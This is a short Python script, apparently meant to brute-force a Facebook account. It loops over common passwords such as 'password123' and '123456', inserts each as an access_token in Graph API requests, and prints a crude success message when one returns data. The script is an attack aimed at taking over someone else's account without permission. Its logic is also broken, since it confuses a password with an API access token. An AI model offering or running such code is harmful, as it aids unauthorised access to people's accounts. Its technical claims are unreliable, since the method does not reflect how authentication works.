
from requests import get
import re

def facebook_password_brute(facebook_id):
    url = f'https://graph.facebook.com/{facebook_id}/tags?access_token=<YOUR_ACCESS_TOKEN>'
    response = get(url).json()

    potential_passwords = ['password123', 'qwerty', '123456', 'letmein', 'admin', '12345678']

    for passwd in potential_passwords:
        response = get(url + f'&fields=name,created_time,access_token&access_token={passwd}').json()

        if len(response['data']) > 0:
            print(f"[ FUCKING A, IT'S {passwd}! ]")
            return passwd

facebook_id = input('Enter the Facebook ID: ')
facebook_password_brute(facebook_id)